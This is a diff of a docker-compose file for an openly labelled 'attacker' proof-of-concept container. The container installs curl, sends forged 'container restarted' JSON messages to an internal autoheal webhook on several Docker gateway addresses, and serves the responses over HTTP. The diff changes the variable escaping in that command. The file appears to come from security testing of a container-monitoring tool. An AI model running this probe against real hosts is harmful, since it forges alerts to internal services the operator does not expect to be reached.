@@ -1,7 +1,7 @@
 services:
   attacker:
     image: python:3-alpine
-    command: ["sh", "-c", "apk add --no-cache curl > /dev/null 2>&1; echo 'PoC alive | container_name=db79996a-f3ed-4d5a-ad6f-8e4194d97f9d_00000000-fake-deploy | label=${A}=caddy' > /tmp/index.html; for gw in 172.17.0.1 172.18.0.1 172.19.0.1 172.20.0.1 host.docker.internal; do echo \"Trying webhook at $gw:8000\" >> /tmp/index.html; curl -s -m 5 -X POST \"http://$gw:8000/webhooks/autoheal\" -H 'Content-Type: application/json' -d '{\"content\":\"Container db79996a-f3ed-4d5a-ad6f-8e4194d97f9d_00000000-fake-deploy (unhealthy) restarted by attacker PoC\"}' >> /tmp/index.html 2>&1; echo '' >> /tmp/index.html; done; cd /tmp && python3 -m http.server 8080"]
+    command: ["sh", "-c", "apk add --no-cache curl > /dev/null 2>&1; echo 'PoC alive | label=$${A}=caddy' > /tmp/index.html; for gw in 172.17.0.1 172.18.0.1 172.19.0.1 172.20.0.1; do echo \"Trying webhook at $$gw:8000\" >> /tmp/index.html; curl -sv -m 5 -X POST \"http://$$gw:8000/webhooks/autoheal\" -H 'Content-Type: application/json' -d '{\"content\":\"Container db79996a-f3ed-4d5a-ad6f-8e4194d97f9d_00000000-fake-deploy (unhealthy) restarted by attacker PoC\"}' >> /tmp/index.html 2>&1; echo '' >> /tmp/index.html; done; cd /tmp && python3 -m http.server 8080"]
     container_name: db79996a-f3ed-4d5a-ad6f-8e4194d97f9d_00000000-fake-deploy
     ports:
       - "8080:8080"
